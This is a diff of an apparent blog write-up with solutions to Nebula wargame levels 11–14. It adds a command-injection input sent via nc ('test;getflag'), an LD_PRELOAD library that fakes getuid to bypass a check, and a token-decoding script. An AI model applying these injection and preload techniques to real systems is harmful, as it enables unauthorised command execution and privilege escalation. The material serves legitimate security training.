@@ -215,7 +215,6 @@ link knowledge:
 
     however,when I first didn't add "chmod +x /tmp/echo" in "mykey",I thought may be there exists some error in level01,and tried to change the source code of /home/flag01/flag01 to file.c:
 
-    -------------content of file.c----------
     #include &lt;stdlib.h&gt;
     #include &lt;unistd.h&gt;
     #include &lt;string.h&gt;
@@ -413,14 +412,51 @@ link knowledge:
     there are two ways:
         (http://blackndoor.com/nebula-level11/)
         (https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md)
-    
-    |way1|
-    ----------way1-----------
-    ----------end------------
-    
-    |way2|
-    ----------way2-----------
-    -----------end-----------
+</code></pre>
+</div>
+
+<h4 id="x12-level12">0x12 level12</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    nc 127.0.0.1 50001
+    Pass:
+        test;getflag &gt; /tmp/level12
+    vi /tmp/level12
+</code></pre>
+</div>
+
+<h4 id="x13-level13">0x13 level13</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    vi /tmp/level13.c
+    -----content-------
+    #include &lt;sys/types.h&gt;
+    int getuid(void)
+    {
+        return 1000; 
+    }
+    -------------------
+    gcc -shared -fPIC /tmp/level13.c -o /tmp/level13.so
+    LD_PRELOAD="/tmp/level13.so"
+    export LD_PRELOAD
+    cp /home/flag13/flag13 /home/level13/
+    /home/level13/flag13
+</code></pre>
+</div>
+
+<h4 id="x14-level14">0x14 level14</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+--------py--------
+def main(string):
+    length=len(string)
+    out=""
+    for i in range(length):
+	#print type(chr(ord(string[length-1-i])-(length-1-i)))
+	#print chr(ord(string[length-1-i])-(length-1-i))[0]
+        out+=(chr(ord(string[length-1-i])-(length-1-i))[0])
+    return out
+if __name__=='__main__':
+    import sys
+    print main(sys.argv[1])
+------------------
 </code></pre>
 </div>
 </span>
